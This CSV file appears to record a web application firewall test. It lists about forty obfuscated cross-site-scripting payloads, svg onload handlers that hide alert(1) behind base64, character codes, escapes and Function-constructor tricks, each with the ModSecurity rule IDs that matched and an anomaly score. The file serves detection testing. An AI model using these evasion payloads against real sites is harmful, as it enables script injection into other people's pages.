index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
1945,"<svg onload=""+(function(){var t=window[`\u0061\u0074\u006f\u0062`];[][`constructor`][`constructor`](`return eval`)()(t(`YWxlcnQoMSk=`))})()""></svg>",0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o15,11v217,147 || o15,11v217,147t:urlDecodeUni || v217,147t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,147t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,147t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,34v217,147t:urlDecodeUni,t:compressWhitespace || ",30,177603505984.384477
1946,"<svg onload=""~function(){var u=self['at'/**/+'ob'];Function('return eval')()((u('YWxlcnQoMSk=')))}()""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o55,41v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,108 || o14,11v217,108t:urlDecodeUni || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,13v217,108t:urlDecodeUni,t:compressWhitespace || ",35,17760350604.794187
1948,"<svg onload=""((new Function('\u0061l'+String.fromCharCode(101)+'r'+'\u0074(1)'))())""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o74,9v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,91 || o15,13v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603506242.657083
1949,"<svg onload=""((new Function('al'+String['fromCharCode'](101)+'r'+'t(1)'))())""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,63v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,84 || o15,13v217,84t:urlDecodeUni || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603506386.143411
1950,"<svg onload=""((new Function('al'+'\x65'+'r'+'t(1)'))())""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o46,9v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,63 || o15,13v217,63t:urlDecodeUni || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603506478.314640
1951,"<svg onload=""((new Function('al'+'ert'+'(1)'))())""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,36v217,57t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,57 || o15,13v217,57t:urlDecodeUni || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603506691.039499
1952,"<svg onload=""((new Function('al'+'\145'+'r'+'t(1)'))())""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o46,9v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,63 || o15,13v217,63t:urlDecodeUni || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603506724.036989
1953,"<svg onload=""((new Function('al'+'e'+'r'+'t'+'(1)'))())""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,42v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,63 || o15,13v217,63t:urlDecodeUni || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603506873.558516
1954,"<svg onload=""((new Function(['al','ert(1)'].join('')))())""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o38,19v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,65 || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603506979.522884
1955,"<svg onload=""((new Function(String.fromCharCode(97,108,101,114,116,40,49,41)))())""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o15,13v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603507030.676495
1956,"<svg onload=""((new Function('al'['\x63oncat']('ert','(1)')))())""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o53,10v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,71 || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603507127.934667
1957,"<svg onload=""((new Function(`${'al'}${'ert'}${String.fromCharCode(40)}1${String.fromCharCode(41)}`))())""></svg>",0,1,block,6,"932130,934100,941100,941120,941160,949110","o28,64v217,111t:urlDecodeUni,t:cmdLine || o15,13v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603507284.794014
1958,"<svg onload=""((new Function('al'.concat('ert(1)')))())""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,41v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,62 || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603507420.835451
1960,"<svg onload=""((new Function('al'+'e'+'r'+'t'+String.fromCharCode(40,49,41)))())""></svg>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o15,13v217,87 || o15,13v217,87t:urlDecodeUni || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603507682.767280
1961,"<svg onload=""((new Function(atob('YWxlcnQoMSk')))())""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,39v217,60t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,60 || v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603507795.354081
1962,"<svg onload=""((new Function('al'['\u0063oncat']('ert(1)')))())""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o47,15v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,70 || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603507890.832018
1963,"<svg onload=""((new Function('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029'))())""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o15,13v217,91 || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603507990.894723
1965,"<svg onload=""((new Function('\141\154\145\162\164\050\061\051'))())""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o15,13v217,75 || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603508289.527702
1967,"<svg onload=""((new Function('retur'+'n aler'+'t'))())(1)"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,43v217,58t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,58 || o15,13v217,58t:urlDecodeUni || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603508421.289510
1968,"<svg onload=""((new Function(String.fromCharCode(114,101,116,117,114,110,32,97,108,101,114,116)))())(1)"">",0,1,block,6,"933210,934100,941100,941120,941160,949110","o96,6v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,104 || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603508532.821819
1972,"<svg onload=""((Function['constru'+'ctor']('return aler'+'t'))())(1)"">",0,1,block,5,"933210,941100,941120,941160,949110","o13,54v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603509051.736500
1975,"<svg onload=""((new Function(atob('cmV0dXJuIGFsZXJ0')))())(1)"">",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,47v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,62 || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603509428.828036
1977,"<svg onload=""((new Function(['ret','urn ','ale','rt'].join('')))())(1)"">",0,1,block,6,"933210,934100,941100,941120,941160,949110","o58,12v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,72 || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603509676.434736
1985,"<svg onload=""((new Function(String['fromCh'+'arCode'](114,101,116,117,114,110,32,97,108,101,114,116)))())(1)"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,95v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o15,13v217,110 || o15,13v217,110t:urlDecodeUni || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603510542.355294
1987,"<svg onload=""(function x(){return top['Function']('ale'+'rt(1)')}())()""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o13,57v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,15v217,78t:urlDecodeUni,t:compressWhitespace || ",25,177603510824.734912
1988,"<svg onload=""(function x(){return [].constructor.constructor('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o13,68v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603510922.278893
1991,"<svg onload=""(function x(){return self['Function']('al'+'ert'+String.fromCharCode(40,49,41))}())()""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o13,85v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || o62,19v217,106 || o62,19v217,106t:urlDecodeUni || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,16v217,106t:urlDecodeUni,t:compressWhitespace || ",35,177603511255.145304
1992,"<svg onload=""(function x(){return globalThis['Function']('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o13,64v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603511313.957282
1993,"<svg onload=""(function x(){return parent['\u0046unction']('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o57,21v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603511566.752282
1994,"<svg onload=""(function x(){return (0,eval)('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o42,21v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603511644.575406
1995,"<svg onload=""(function x(){return window['eval']('ale'+'rt(1)')}())()""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o13,56v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,14v217,77t:urlDecodeUni,t:compressWhitespace || ",25,177603511795.312003
1996,"<svg onload=""(function x(){return ''['constructor']['constructor']('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o13,74v217,95t:urlDecode,t:replaceComments,t:compressWhitespace || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603511857.357226
1997,"<svg onload=""(function x(){return (function(){}).constructor('ale'+'rt(1)')}())()""></svg>",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,68v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,89 || o35,11v217,89t:urlDecodeUni || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603511948.799290
1998,"<svg onload=""(function x(){return []['find']['constructor']('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o13,67v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603512053.589818
1999,"<svg onload=""(function x(){return []['filter']['constructor']('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o13,69v217,90t:urlDecode,t:replaceComments,t:compressWhitespace || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603512140.911134
2000,"<svg onload=""(function x(){return top[String.fromCharCode(70,117,110,99,116,105,111,110)]('ale'+'rt(1)')}())()""></svg>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o89,21v217,118t:urlDecode,t:replaceComments,t:compressWhitespace || o38,19v217,118 || o38,19v217,118t:urlDecodeUni || v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,55v217,118t:urlDecodeUni,t:compressWhitespace || ",35,177603512210.306324
2001,"<svg onload=""(function x(){return window['Function']['call'](null,'ale'+'rt(1)')}())()""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o13,73v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o34,18v217,94t:urlDecodeUni,t:compressWhitespace || ",25,177603512488.824464
2002,"<svg onload=""(function x(){return setTimeout['constructor']('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o13,67v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603512513.636234
2003,"<svg onload=""(function x(){return (async()=>{})['constructor']('ale'+'rt(1)')}())()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o47,36v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603512655.620156
